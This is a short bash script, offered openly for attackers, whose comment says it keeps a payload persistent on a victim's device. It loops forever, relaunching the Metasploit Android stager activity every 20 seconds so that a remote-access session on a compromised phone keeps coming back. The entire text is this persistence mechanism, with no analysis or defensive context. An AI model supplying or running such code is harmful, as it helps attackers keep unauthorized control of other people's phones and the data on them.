#this script is used when you want your payload as persistence in victim's device
#!/bin/bash
while true
do am start -user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done
